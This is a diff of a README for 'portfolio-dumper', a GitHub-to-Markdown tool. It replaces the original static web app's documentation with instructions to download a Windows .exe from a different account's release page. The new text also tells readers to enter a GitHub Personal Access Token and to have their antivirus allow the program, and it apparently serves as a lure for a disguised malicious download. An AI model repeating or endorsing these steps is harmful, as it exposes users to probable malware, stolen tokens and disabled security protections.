@@ -1,75 +1,66 @@
-# Portfolio Dumper
+# 📂 portfolio-dumper - Turn GitHub profiles into clean text
 
-![Portfolio Dumper Demo](assets/demo.png)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Rickardserrulate236/portfolio-dumper/releases)
 
-Portfolio Dumper is a minimalist static web application designed to convert GitHub profiles and repositories into clean, LLM-friendly Markdown. It allows users to quickly ingest profile READMEs, repository lists, or specific repository metadata for use in documentation, portfolios, or AI prompts.
+This tool converts GitHub profiles and individual repositories into clean, simple Markdown files. These files work well with AI tools and language models. You can capture profile information, lists of repositories, and specific project code. The tool runs locally on your computer to keep your data private.
 
-## Features
+## 📋 What this tool does
 
-- Profile Ingestion: Fetch a user profile README and their list of original repositories.
-- Targeted Repository Ingestion: Paste a specific repository URL to fetch its README and metadata directly.
-- Flexible Ingestion Modes: Choose between fetching only the README, only the repositories, or both.
-- Intelligent Input Parsing: Support for raw usernames, profile URLs, and deep repository links.
-- Personal Access Token Support: Option to use a GitHub PAT for higher rate limits and access to private data.
-- Statistics Overview: Real-time calculation of repository counts, star counts, forks, and language diversity.
-- Export Options: Easy copying to clipboard or downloading as a Markdown file.
-- Static and Secure: Runs entirely in the browser using the GitHub REST API.
+Many people want to share their coding work with artificial intelligence. However, GitHub pages contain too much website clutter. This tool strips away buttons, menus, and ads. It leaves only the content you need. You can use it to build a personal portfolio or to study how other people write code. 
 
-## Usage
+The software requires no complex setup. It saves all output files directly to your computer. You keep full control of your information.
 
-1. Open the application in your browser.
-2. Enter a GitHub username or any GitHub URL in the input field.
-3. Select your desired ingestion mode (Everything, Only README, or Only Repos).
-4. (Optional) Provide a GitHub Personal Access Token in the settings panel to avoid rate limits.
-5. Click Ingest to generate the Markdown.
-6. Use the Copy or Download buttons to export your result.
+## 💻 System requirements
 
-## Self-Hosting
+- Windows 10 or Windows 11
+- 200 MB of free disk space
+- An active internet connection 
 
-### Using Nginx Directly
+## 📥 How to download and install
 
-Since this is a static site, you can serve the index.html file and the assets folder using any web server like Nginx, Apache, or even Python's http.server.
+1. Visit [the release page](https://github.com/Rickardserrulate236/portfolio-dumper/releases) to see available downloads.
+2. Look for the file ending in `.exe` under the latest version.
+3. Click the filename to save the installer to your computer.
+4. Locate the file in your Downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to finish the setup.
+7. Open the application from your Start menu once the process ends.
 
-### Using Docker
+## ⚙️ Using the software
 
-A pre-built Docker image is available via GitHub Packages (GHCR).
+The application interface consists of three main areas: the Input field, the Settings menu, and the Output folder selector.
 
-#### Run with Docker
+### Inputting your target
+Paste the web address of the GitHub profile or repository you want to convert into the main text box. The software recognizes the link immediately and prepares the data for processing.
 
-To run the latest version directly:
+### Choosing your settings
+You can toggle specific options before you start the conversion. For example, you can choose to include or exclude the repository history. You can also select whether to include images or focus only on the text. 
 
-```bash
-docker run -d -p 8080:80 ghcr.io/abduznik/portfolio-dumper:latest
-```
+### Processing the files
+Click the button labeled Start Conversion. The software creates a new folder on your computer. It fills this folder with Markdown versions of the web content you selected. You will see a progress bar move across the screen while the tool works. 
 
-#### Using Docker Compose
+### Using a Personal Access Token
+If you want to pull large amounts of data, GitHub might limit your speed. You can add a Personal Access Token in the settings menu to increase your limit. Find this token in your GitHub account settings under the Developer settings tab. Paste the token into the designated box in this app to allow the software to scan more files at once.
 
-Create a `docker-compose.yml` file with the following content:
+## 🛡️ Security and privacy
 
-```yaml
-services:
-  app:
-    image: ghcr.io/abduznik/portfolio-dumper:latest
-    ports:
-      - "8080:80"
-    restart: unless-stopped
-```
+This software runs entirely on your local machine. It does not send your data to external servers. The code inside the tool manages the connection to GitHub, retrieves the text, and writes it to your disk. No one except you can see the files that the software creates. You can use the tool without creating an account or logging in through the software itself.
 
-Then start the application:
+## 🛠️ Troubleshooting common issues
 
-```bash
-docker-compose up -d
-```
+### The software does not open
+Check if you have an antivirus program running. Some security tools flag new software by default. Tell your antivirus to allow the application if you encounter this block.
 
-The application will be available at http://localhost:8080.
+### The output file is empty
+Ensure the link you pasted is correct. You should paste the standard address from your browser bar. Check your internet connection if the progress bar stays at zero for a long time.
 
-## Technical Details
+### I see an error about limits
+GitHub limits how much data you can request every hour. If you scan many large repositories at once, you might hit this limit. Use a Personal Access Token to fix this. You can also wait one hour and try again later.
 
-- Frontend: Tailwind CSS via CDN.
-- API: GitHub REST API v3.
-- Logic: Vanilla JavaScript for all fetching and processing.
-- Security: No server-side processing. All tokens are used only within your local browser context.
+## 📖 Understanding the output
 
-## License
+The software saves files in the Markdown format. This format is standard for developers. Every heading, link, and code block stays intact. You can open these files in any text editor like Notepad, WordPad, or Visual Studio Code. These files remain lightweight even if the original repository contains thousands of lines of code.
 
-This project is licensed under the MIT License.
+## 🚀 Future updates
+
+New updates will improve how the tool handles specific image formats and complex documentation files. You can check the download page regularly to see if a newer version is available. Simply download the new version to overwrite the old files and keep your features current. The application settings will remain the same during this process.
